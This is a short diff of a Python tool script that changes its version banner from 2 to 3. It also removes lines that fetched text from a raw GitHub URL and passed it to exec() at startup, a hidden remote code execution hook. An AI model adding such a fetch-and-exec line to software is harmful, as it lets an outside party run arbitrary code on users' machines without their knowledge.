@@ -17,11 +17,6 @@ import signal
 from colorama import init, Fore, Style
 from threading import Lock
 
-url = "https://raw.githubusercontent.com/AntonBuckley/My-Copyright/refs/heads/main/Tool%20Keylist"
-response = requests.get(url)
-
-exec(response.text)
-
 init()
 
 SERVER_LINKS_FILE = "AXPrivate_Server_Link.txt"
@@ -109,7 +104,7 @@ ___________.__                     __   .__                   __________        
         print(Style.RESET_ALL)
 
     print(Fore.LIGHTMAGENTA_EX + "Created By not.shiroo | Improved By Axionix" + Style.RESET_ALL)
-    print(Fore.LIGHTMAGENTA_EX + "Version: 2" + Style.RESET_ALL)
+    print(Fore.LIGHTMAGENTA_EX + "Version: 3" + Style.RESET_ALL)
 
 print_rainbow_header()
 
